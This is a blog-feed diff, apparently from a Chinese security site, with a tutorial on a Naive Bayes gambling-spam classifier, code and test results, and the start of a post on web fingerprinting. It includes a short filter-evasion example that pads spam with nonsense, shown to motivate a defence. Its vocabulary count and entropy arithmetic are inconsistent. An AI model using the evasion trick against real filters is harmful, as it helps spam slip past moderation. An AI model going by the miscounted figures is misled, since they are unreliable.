+<p>P(输入句子|赌博) = (P(词语1) <em> P(词语2|词语1) </em> P(词语3|词语2))|赌博) ≈ P(词语1)|P(赌博) <em> P(词语2)|P(赌博) </em> P(词语3)|P(赌博)</p>
+<p>P(警方召开了全省…赌马等赌博活动。|赌博) = P(警方|赌博) <em> P(召开|赌博) </em> P(全省|赌博) …  <em> P(赌马|赌博) </em> P(赌博活动|赌博)</p>
+</blockquote>
+<p> 我们把P(输入句子|赌博)分解成所有P(词语|赌博)概率的乘积，然后通过训练数据，计算每个词语在不同类别出现的概率。最终获取的是<strong>输入句子有效词语在不同类别中的概率</strong>。</p>
+</li>
+</ol>
+<p><img src="http://p6usvwwl2.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180408145057.jpg" alt=""></p>
+<p>在上面的例子中，虽然<strong>赌马</strong>，<strong>赌球</strong>，<strong>赌博活动</strong>这几个词是赌博类别的概率很高，但是综合所有词语，分类器判断输入句子有80%的概率是正常句子。<strong>简单来说，要判断句子是某个类别的概率，只需要计算该句子有效部分的词语的在该类别概率的乘积。</strong></p>
+<h2 id="贝叶斯模型实现"><a href="#贝叶斯模型实现" class="headerlink" title="贝叶斯模型实现"></a>贝叶斯模型实现</h2><p>要计算每个词语在不同类别下出现的概率，有以下几个步骤：</p>
+<ol>
+<li>选择训练数据，标记类别</li>
+<li>把所有训练数据进行分词，并且组成成一个包含所有词语的词袋集合</li>
+<li>把每个训练数据转换成词袋集合长度的向量</li>
+<li>利用每个类别的下训练数据，计算词袋集合中每个词语的概率</li>
+</ol>
+<h3 id="选择训练数据"><a href="#选择训练数据" class="headerlink" title="选择训练数据"></a>选择训练数据</h3><p>训练数据的选择是非常关键的一步，我们可以从网络上搜索符合对应类别的句子，使每个类别的数据各占一半。不过当你理解了贝叶斯模型的原理之后，你会发现一个难题问题，就是如何保持数据的独立分布，例如你选择的训练数据如下：</p>
+<ul>
+<li><p>赌博类别</p>
+<blockquote>
+<p>根据您所选择的上述六合彩游戏，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
+<p>奖金将在您完成首存后即可存入您的账户。真人荷官 六合彩 欢迎来到全新番摊游戏！</p>
+</blockquote>
+</li>
+<li><p>正常类别</p>
+<blockquote>
+<p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。</p>
+<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
+</blockquote>
+</li>
+</ul>
+<p>我们可以注意到<strong>六合彩</strong>，<strong>游戏</strong>这两个词语，只在赌博类别的训练数据出现。这两个词语对句子是否是赌博类别会有很大的影响性，<strong>六合彩</strong>对赌博类别确实是重要的判别词，但是<strong>游戏</strong>这个词语本身和赌博没有直接的关系，却被错误划分为赌博类别相关的词语，当之后分类器遇到</p>
+<blockquote>
+<p>我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略</p>
+</blockquote>
+<p>会因为里面的<strong>游戏</strong>，将它判断为赌博类别，</p>
+<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略&apos;)
+&gt;&gt;&gt; result.percentage
+[(&apos;gamble.dat&apos;, 0.793), (&apos;normal.dat&apos;, 0.207)]
+&gt;&gt;&gt; result.word_list
+[(&apos;游戏&apos;, 1.9388011143762069)]
+</code></pre><p>所以，当我们要做一个赌博/正常的分类器，我们需要在正常类别的训练数据添加：</p>
+<blockquote>
+<p>中国游戏第一门户站,全年365天保持不间断更新,您可以在这里获得专业的游戏新闻资讯,完善的游戏攻略专区</p>
+</blockquote>
+<p>这样的正常而且带有<strong>游戏</strong>关键字的句子。同时当训练数据过少，输入句子包含了训练数据中并没有c出现过的词语，该词语也会被分类器所忽略。<a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)可以通过启用debug模式得到被错误划分的数据以及其权重最高的词语，你可以根据输出的词语来调整训练数据。我们之后可以通过Adaboost算法动态调整每个词语的权重，这个功能我们会在下一个版本推出。 另外一方面，现实生活中，正常的句子比赌博类别的句子出现的概率要多得多，这点我们也可以从训练数据的比例上面体现，适当增加正常类别句子的数量，也可以赋予正常类别句子高权重，不过要小心<a href="https://en.wikipedia.org/wiki/Accuracy_paradox" rel="external nofollow noopener noreferrer" target="_blank">Accuracy_paradox</a>的问题。我们在<a href="#测试">测试</a>的时候，可以根据混淆矩阵以及ROC曲线来分析分类器的效果，再进行数据调整。</p>
+<h3 id="词袋集合"><a href="#词袋集合" class="headerlink" title="词袋集合"></a>词袋集合</h3><p>为简单起见，本篇文章只选取4个句子作为训练数据：</p>
+<ul>
+<li><p>赌博类别：</p>
+<blockquote>
+<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
+<p>奖金将在您完成首存后即可存入您的账户。真人荷官 体育博彩 欢迎来到全新番摊游戏！</p>
+</blockquote>
+</li>
+<li><p>正常类别：</p>
+<blockquote>
+<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
+<p>在公安机关持续不断的打击下，六合彩、私彩赌博活动由最初的公开、半公开状态转入地下。</p>
+</blockquote>
+</li>
+</ul>
+<p>要计算每个词语在不同类别下的概率，首先需要一个词袋集合，集合包含了训练数据中所有非重复词语(_vocab_list)，参考函数_get_vocab_list：</p>
+<pre><code>def _get_vocab_list(self):
+    &apos;&apos;&apos;
+    Get a list contain all unique non stop words belongs to train_data
+    Set up:
+    self.vocab_list:
+        [
+            &apos;What&apos;, &apos;lovely&apos;, &apos;day&apos;,
+            &apos;like&apos;, &apos;gamble&apos;, &apos;love&apos;, &apos;dog&apos;, &apos;sunkist&apos;
+        ]
+    &apos;&apos;&apos;
+    vocab_set = set()
+    all_train_data = &apos;&apos;.join([v for _, v in self._train_data])
+    token = Token(text=all_train_data, lan=self.lan, split=self.split)
+    vocab_set = vocab_set | set(token.tokenizer)
+    self._vocab_list = list(vocab_set)
+</code></pre><p>默认使用<a href="https://github.com/fxsjy/jieba" rel="external nofollow noopener noreferrer" target="_blank">结巴分词</a>进行中文分词（你可以定制分词函数），例如第一个数据：</p>
+<blockquote>
+<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
+</blockquote>
+<p>分词后会得到：</p>
+<pre><code>[&apos;根据&apos;, &apos;您&apos;, &apos;所&apos;, &apos;选择&apos;, &apos;的&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;，&apos;, &apos;您&apos;, &apos;必须&apos;, &apos;在&apos;, &apos;娱乐场&apos;, &apos;完成&apos;, &apos;总金额&apos;, &apos;（&apos;, &apos;存款&apos;, &apos;+&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;）&apos;, &apos;16&apos;, &apos;倍&apos;, &apos;或&apos;, &apos;15&apos;, &apos;倍&apos;, &apos;流水&apos;, &apos;之后&apos;, &apos;，&apos;, &apos;方可&apos;, &apos;申请&apos;, &apos;提款&apos;, &apos;。&apos;]
+</code></pre><p>我们去掉包含在stop_word.dat中的词语，stop_word.dat包含了汉语中的常见的转折词：</p>
+<blockquote>
+<p>如果，但是，并且，不只…</p>
+</blockquote>
+<p>这些词语对于我们分类器没有用处，因为任何类别都会出现这些词语。接下来再去掉长度等于1的字，第一个训练数据剩下：</p>
+<pre><code>[&apos;选择&apos;, &apos;上述&apos;, &apos;礼遇&apos;, &apos;娱乐场&apos;, &apos;总金额&apos;, &apos;存款&apos;, &apos;首存&apos;, &apos;奖金&apos;, &apos;16&apos;, &apos;15&apos;, &apos;流水&apos;, &apos;申请&apos;, &apos;提款&apos;]
+</code></pre><p>遍历4个句子最终得到长度为49的词袋集合(vocab_list)：（这里使用的集合是无序的，所以你得到的结果顺序可能不同）</p>
+<pre><code>[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
+</code></pre><p>得到词袋之后，再次使用训练数据，并把每个训练数据都转变成一个长度为49的一维向量</p>
+<pre><code>def _get_vocab_matrix(self):
+    &apos;&apos;&apos;
+    Convert strings to vector depends on vocal_list
+    &apos;&apos;&apos;
+    array_list = []
+    for k, data in self._train_data:
+        return_vec = np.zeros(len(self._vocab_list))
+        token = Token(text=data, lan=self.lan, split=self.split)
+        for i in token.tokenizer:
+            if i in self._vocab_list:
+                return_vec[self._vocab_list.index(i)] += 1
+        array_list.append(return_vec)
+    self._matrix_lst = array_list
+</code></pre><blockquote>
+<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
+</blockquote>
+<p>对应转变成：</p>
+<pre><code># 长度为49的一维向量
+[1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
+</code></pre><p>其中的1分别对应着数据分词后的词语在词袋中出现的次数。接下来将所有训练数据的一维向量组合成列表_matrix_list</p>
+<pre><code>[
+    [1, 0, 0, 0, 1, 0, ..., 1, 0, 1]
+    [0, 1, 1, 0, 0, 0, ..., 0, 0, 0]
+    ...
+]
+</code></pre><p><strong>要计算每个词语在不同类别下的概率，只需要把词语出现的次数除以该类别的所有词语的总数，</strong> <a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>出于效率的考虑使用了numpy的矩阵运算。</p>
+<pre><code>def _training(self):
+    &apos;&apos;&apos;
+    Native bayes training
+    &apos;&apos;&apos;
+    self._ps_vector = []
+    # 防止有词语在其他类别训练数据中没有出现过，最后的P(句子|类别)乘积就会为零，所以给每个词语一个初始的非常小的出现概率，设置vector默认值为1，cal对应为2
+    # vector: 默认值为1的一维数组
+    # cal: 默认的分母，计算该类别所有有效词语的总数
+    # num: 计算P(赌博), P(句子)
+    vector_list = [{
+        &apos;vector&apos;: np.ones(len(self._matrix_lst[0])),
+        &apos;cal&apos;: 2.0, &apos;num&apos;: 0.0} for i in range(len(self.CLASSIFY))]
+    for k, v in enumerate(self.train_data):
+        vector_list[v[0]][&apos;num&apos;] += 1
+        # vector加上对应句子的词向量，最后把整个向量除于cal，就得到每个词语在该类别的概率。
+        # [1, 0, 0, 0, 1, 0, ..., 1, 0, 1] (根据您所选择的...)
+        # [0, 1, 1, 0, 0, 0, ..., 0, 0, 0] (奖金将在您完成...)
+        #                   +
+        # [1, 1, 1, 1, 1, 1, ..., 1, 1, 1] 
+        vector_list[v[0]][&apos;vector&apos;] += self._matrix_lst[k]
+        vector_list[v[0]][&apos;cal&apos;] += sum(self._matrix_lst[k])
+    for i in range(len(self.CLASSIFY)):
+        # 每个词语的概率为[2, 2, 2, 1, 2, 1, ..., 2, 1, 2]/cal
+        self._ps_vector.append((
+            np.log(vector_list[i][&apos;vector&apos;]/vector_list[i][&apos;cal&apos;]),
+            np.log(vector_list[i][&apos;num&apos;]/len(self.train_data))))
+</code></pre><p>遍历完所有训练数据之后，会得到两个类别对应的每个词语的概率向量，(为了防止python的小数相乘溢出，这里的概率都是取np.log()对数之后得到的值)：</p>
+<pre><code>#赌博
+([-2.80336038, -2.80336038, -2.80336038, -3.49650756, -3.49650756,
+   -2.80336038, -3.49650756, -2.39789527, -2.80336038, -3.49650756,
+   -3.49650756, -3.49650756, -2.80336038, -2.80336038, -3.49650756,
+   -3.49650756, -3.49650756, -3.49650756, -2.80336038, -2.80336038,
+   -3.49650756, -2.80336038, -3.49650756, -2.80336038, -2.80336038,
+   -3.49650756, -2.80336038, -2.80336038, -3.49650756, -2.80336038,
+   -2.80336038, -2.39789527, -3.49650756, -3.49650756, -3.49650756,
+   -2.80336038, -3.49650756, -3.49650756, -2.80336038, -3.49650756,
+   -3.49650756, -2.80336038, -2.80336038, -2.80336038, -3.49650756,
+   -2.80336038, -2.80336038, -3.49650756, -2.39789527, -2.80336038,
+   -3.49650756, -2.80336038]), 0.5)
+
+# 正常
+([-3.25809654, -3.25809654, -3.25809654, -2.56494936, -2.56494936,
+   -3.25809654, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
+   -2.56494936, -2.56494936, -3.25809654, -3.25809654, -2.56494936,
+   -2.56494936, -2.56494936, -2.56494936, -3.25809654, -3.25809654,
+   -2.56494936, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
+   -2.56494936, -3.25809654, -3.25809654, -2.56494936, -3.25809654,
+   -3.25809654, -3.25809654, -2.56494936, -2.56494936, -2.56494936,
+   -3.25809654, -2.56494936, -2.56494936, -3.25809654, -2.56494936,
+   -2.56494936, -3.25809654, -3.25809654, -3.25809654, -2.56494936,
+   -3.25809654, -3.25809654, -2.56494936, -3.25809654, -3.25809654,
+   -2.56494936, -3.25809654]), 0.5)
+
+# 词袋集合 
+[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
+</code></pre><p>结合向量和词袋集合来看，<strong>提款</strong>，<strong>存入</strong>，<strong>游戏</strong>这几个词是赌博的概率要大于正常的概率</p>
+<pre><code>#赌博 提款，存入，游戏
+[-2.80336038, -2.80336038, -2.80336038]
+
+#正常 提款，存入，游戏
+[-3.25809654, -3.25809654, -3.25809654]
+</code></pre><p>符合我们的常识，接下来就可以进行输入句子的分类了。</p>
+<h3 id="判断类别"><a href="#判断类别" class="headerlink" title="判断类别"></a>判断类别</h3><p>训练完数据，得到词语对应概率之后，判断类别就非常简单，<strong>只需要把输入句子进行相同的分词，然后计算对应的词语对应的概率的乘积即可，</strong>得到乘积最大的就是最有可能的类别。输入句子：<br>​<br>    欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。</p>
+<p>先根据原先的词袋集合，先转变为一维向量</p>
+<pre><code># 词袋集合
+[&apos;提款&apos;, &apos;存入&apos;, &apos;游戏&apos;, &apos;最初&apos;, &apos;六合彩&apos;, &apos;娱乐场&apos;, &apos;费曼&apos;, &apos;奖金&apos;, &apos;账户&apos;, &apos;菲利普斯&apos;, &apos;量子&apos;, &apos;电动力学&apos;, &apos;总金额&apos;, &apos;上述&apos;, &apos;活动&apos;, &apos;状态&apos;, &apos;物理学家&apos;, &apos;公安机关&apos;, &apos;荷官&apos;, &apos;即可&apos;, &apos;理论&apos;, &apos;申请&apos;, &apos;半公开&apos;, &apos;选择&apos;, &apos;15&apos;, &apos;打击&apos;, &apos;全新&apos;, &apos;来到&apos;, &apos;公开&apos;, &apos;方可&apos;, &apos;博彩&apos;, &apos;完成&apos;, &apos;理查德&apos;, &apos;纳米技术&apos;, &apos;不断&apos;, &apos;存款&apos;, &apos;之一&apos;, &apos;创始人&apos;, &apos;真人&apos;, &apos;私彩&apos;, &apos;持续&apos;, &apos;根据&apos;, &apos;必须&apos;, &apos;16&apos;, &apos;赌博&apos;, &apos;欢迎&apos;, &apos;体育&apos;, &apos;转入地下&apos;, &apos;首存&apos;, &apos;流水&apos;, &apos;美国&apos;, &apos;礼遇&apos;]
+# 长度为49的一维向量
+[0, 0, 1, 0, 1, ...]
+</code></pre><p>然后与分别与两个概率向量相乘，求和，并加上对应的类别占比，对应的代码：</p>
+<pre><code>def _bayes_classify(self):
+    &apos;&apos;&apos;
+    Calculate the probability of different category
+    &apos;&apos;&apos;
+    possibility_vector = []
+    log_list = []
+    # self._ps_vector: ([-3.44, -3.56, -2.90], 0.4)
+    for i in self._ps_vector:
+        # 计算每个词语对应概率的乘积
+        final_vector = i[0] * self.word_vec
+        # 获取对分类器影响度最大的词语
+        word_index = np.nonzero(final_vector)
+        non_zero_word = np.array(self._vocab_list)[word_index]
+        # non_zero_vector: [-7.3, -8]
+        non_zero_vector = final_vector[word_index]
+        possibility_vector.append(non_zero_vector)
+        log_list.append(sum(final_vector) + i[1])
+    possibility_array = np.array(possibility_vector)
+    max_val = max(log_list)
+    for i, j in enumerate(log_list):
+        # 输出最大概率的类别
+        if j == max_val:
+            max_array = possibility_array[i, :]
+            left_array = np.delete(possibility_array, i, 0)
+            sub_array = np.zeros(max_array.shape)
+            # 通过曼哈顿举例，计算影响度最大的词语
+            for k in left_array:
+                sub_array += max_array - k
+            return self._update_category(log_list), \
+                sorted(
+                    list(zip(non_zero_word, sub_array)),
+                    key=lambda x: x[1], reverse=True)
+</code></pre><p>通过计算：</p>
+<blockquote>
+<p>P(赌博|句子) = sum([0, 0, 1, 0, 1, …] * [-2.80336038, -2.80336038, -2.80336038, …]) + P(赌博) = 0.85</p>
+<p>P(正常|句子) = sum([0, 0, 1, 0, 1, …] * [-3.25809654, -3.25809654, -3.25809654, …])+ P(正常) = 0.15</p>
+</blockquote>
+<p>最终得到P(赌博|句子) &gt; P(正常|句子)，所以分类器判断这个句子是赌博类别。</p>
+<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;欢迎参加澳门在线娱乐城，这里有体育，百家乐，六合彩各类精彩游戏。&apos;)
+&gt;&gt;&gt; result.percentage
+[(&apos;gamble.dat&apos;, 0.85), (&apos;normal.dat&apos;, 0.15)]
+&gt;&gt;&gt; result.word_list
+[(&apos;六合彩&apos;, 0.96940055718810347), (&apos;游戏&apos;, 0.96940055718810347), (&apos;欢迎&apos;, 0.56393544907993931)]
+</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h3><p>测试方法有留出法(hold-out)，k折交叉验证法(cross validation)，自助法(bootstrapping)，这里我们使用留出法，测试脚本默认每次从所有数据中选出60个句子当成测试数据，剩下的当成训练数据。重复进行测试10次。运行测试脚本</p>
+<pre><code>&gt;&gt;&gt; python runanalysis.py
+This may takes some time, Go get a coffee :D.
+Building prefix dict from the default dictionary ...
+Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache
+Loading model cost 0.914 seconds.
+Prefix dict has been built succesfully.
++Cherry---------------+------------+------------+
+| Confusion matrix    | gamble.dat | normal.dat |
++---------------------+------------+------------+
+| (Real)gamble.dat    |        249 |          0 |
+| (Real)normal.dat    |         13 |        338 |
+| Error rate is 2.17% |            |            |
++---------------------+------------+------------+
+</code></pre><p>输出分类测试数据的平均错误率为2.17%，同时我们可以通过混淆矩阵对分类器进行分析：</p>
+<p><img src="http://p6usvwwl2.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180408144928.jpg" alt=""></p>
+<ul>
+<li><p>查全率(recall)（能找出赌博类别句子的概率）</p>
+<p>  真阳性/(真阳性+假阴性)<br>  249 / 249 = 100%</p>
+</li>
+<li><p>查准率(precision)（分类为赌博类别中的句子，确实是赌博类别的概率）</p>
+<p>  真阳性/(真阳性+假阳性)<br>  249 / (249 + 13) = 95%</p>
+</li>
+</ul>
+<p>如果业务的需求是尽可能找到潜在的阳性数据（例如癌症初检）那么就要求高查全率，不过对应的，高查全率会导致查准率降低。（可以这样理解，假如所有句子都判断成赌博类别，那么所有确实是赌博类别的句子确实都被检测到了，但是查准率变得很低。）影响查全率以及查准率的一点是训练数据数量的比例，日常的句子中，赌博类别的句子与正常类别的句子比例可能是1:50。也就是说随便给出一个句子，不用看内容，那么它有98%是正常的。不过在某些情况下，例如热门评论区打广告的用户就很多，那么这个比例就变成1:10或者1:20，这个比例是根据具体业务而调整的。<strong>训练数据也应该遵循这个比例，但是实现中，我们必须要找到大量独立分布的数据才能遵循这个比例，这就是机器学习数据常遇到的不均衡分类问题。要解决这个问题，可以引入Adaboost算法动态调整每个词语的权重。</strong>。我们可以通过-p参数输出ROC曲线：</p>
+<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/auc.png" alt="roc"></p>
+<p>ROC曲线横坐标代表的是假阳性（没有问题却被判断为有问题），纵坐标代表的是真阳性（有问题而且被判断出来），一个优秀的分类器尽可能维持高真阳性以及低假阳性。一般来说，如果一个分类器的ROC曲线包含了另外一个分类器的ROC曲线，代表此分类器在此数据集的分类效果更好。</p>
+<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><ul>
+<li><a href="#上下文关联">上下文关联</a></li>
+<li><a href="#分类器绕过">分类器绕过</a></li>
+</ul>
+<h3 id="上下文关联"><a href="#上下文关联" class="headerlink" title="上下文关联"></a>上下文关联</h3><p>当我们计算P(输入句子|类别)的时候，我们把输入句子分成了词语的集合，<strong>同时假定了输入句子中词语与词语之间没有上下文关系，</strong>其实这是不完全正确的，例如：</p>
+<pre><code>警方召开了全省集中打击赌博违法犯罪活动...
+</code></pre><p>从常识句子的上下文判断，<strong>集中打击</strong>出现在<strong>赌博违法犯罪</strong>之前的概率，要比<strong>召开</strong>出现在<strong>赌博违法犯罪</strong>之前的概率高，不过当我们把输入句子分成词语的集合的时候，把它们看成每个词语都是独立分布的。这也是此算法称为朴素贝叶斯的原因，如果我们有大量的数据集，计算出<strong>每个词语对应词袋模型其他词语的出现概率值的话，可以提高检测的准确率。</strong></p>
+<p>要注意的是，训练数据选择与最后进行分类的数据必须尽量关联，如果要检测的句子与训练数据有非常大的差别，例如检测的内容包含大量的英文单词，但是训练数据却没有，那么分类器就无法进行正确的分类。同时，输入句子过短的话，分类器也无法很好地进行分类。因为分类的结果会很容易被其中的一两个词语所影响。</p>
+<h4 id="分类器绕过"><a href="#分类器绕过" class="headerlink" title="分类器绕过"></a>分类器绕过</h4><p>分类器无法分辨重复内容或部分无意义文本，输入句子：</p>
+<blockquote>
+<p>车厘子车厘子车厘子车厘子</p>
+<p>加入博彩121加qq看头像，很为温暖文科楼课文你问你看我呢额可能我呃让你听客啊啊爱看就是是过分过分你问人人官方代购极为。</p>
+</blockquote>
+<p>前两个是垃圾内容，但是即使我们添加垃圾内容的数据集，也很难判断正确。最后一个前一小段是赌博类别的句子，后面一长串是无意义或者正常类别的句子，分类器综合判断它是正确的句子。<strong>解决这个问题我们可以用一个简单的方法，计算句子的熵，也就是无序程度。</strong>每个句子都有合理的长度以及合理的无序程度，什么意思呢？句子的长度大约遵循正态分布，极长（不包含标点符号）或者极短的句子出现的概率比较低，同时，通常一个句子中的词语不会重复出现很多次，它的无序程度是在某个范围的。当我们看到前两个句子，因为它们词语的重复度非常高，所以句子的无序度非常低，如何计算句子的无序程度呢？</p>
+<ol>
+<li><p>我们找两个输入句子作为例子，先把输入句子进行分词</p>
+<blockquote>
+<p>车厘子是一只非常可爱的猫咪</p>
+<p>车厘子车厘子车厘子车厘子</p>
+</blockquote>
+<pre><code>[车厘子，非常，可爱，猫咪]
+[车厘子，车厘子，车厘子，车厘子]
+</code></pre></li>
+<li><p>计算每个词语出现的次数除于句子的词语数量：</p>
+<p> P(车厘子) = P(非常) = P(可爱) = P(猫咪) = 1/4 (句子1)</p>
+<p> P(车厘子) = 4/4 = 1 (句子2)</p>
+<p> 通过计算熵的公式，带入每个概率值，最后除于句子的词语数量</p>
+<pre><code>H = -sum(p(x)log2p(x))
+
+H1 = ((1/4 * -2) - (1/4 * -2) - (1/4 * -2) - (1/4 * -2)) / 4= -2 / 4 = -1/2
+
+H2 = 0
+</code></pre></li>
+</ol>
+<p>可以看到，在同样的句子长度下，第一个句子的熵为-2，第二个为0，可以设置一个熵的范围，如果低于该值，代表句子可能是垃圾数据。一般来说，先进行垃圾文本过滤，然后进行贝叶斯模型的分类，在工程中会有更好的效果。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>理解了贝叶斯分类的原理，你就能根据自己的业务需求，来判断使用什么分词函数，使用哪些stop_word，可以定制适合业务的数据集，同时根据输出的被错误分类的数据以及混淆矩阵，做出对应的调整。</strong>如果有什么疑问，欢迎留言。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;贝叶斯模型在机器学习以及人工智能中都有出现，&lt;a href=&quot;https://github.com/Sunkist-Cherry/cherr
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="贝叶斯分类" scheme="http://www.future-sec.com/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB/"/>
+    
+  </entry>
   
   <entry>
     <title>芯片安全系列-Let&#39;s cook!</title>
@@ -451,6 +982,65 @@
   </entry>
   
   <entry>
+    <title>浅谈现代化指纹识别及工具编写</title>
+    <link href="http://www.future-sec.com/yet-another-web-fingerprinter.html"/>
+    <id>http://www.future-sec.com/yet-another-web-fingerprinter.html</id>
+    <published>2017-11-26T16:00:00.000Z</published>
+    <updated>2017-11-27T11:19:40.481Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p>
+<h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15047737007020.jpg" alt="img"><br>存在几个问题</p>
+<ol>
+<li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li>
+<li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li>
+</ol>
+<h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109122240334.jpg" alt="img"></p>
+<p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109123220322.jpg" alt="img"></p>
+<p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p>
+<h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'port'</span>:<span class="number">7001</span>,<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
+<p>下面介绍每一种指纹库实例</p>
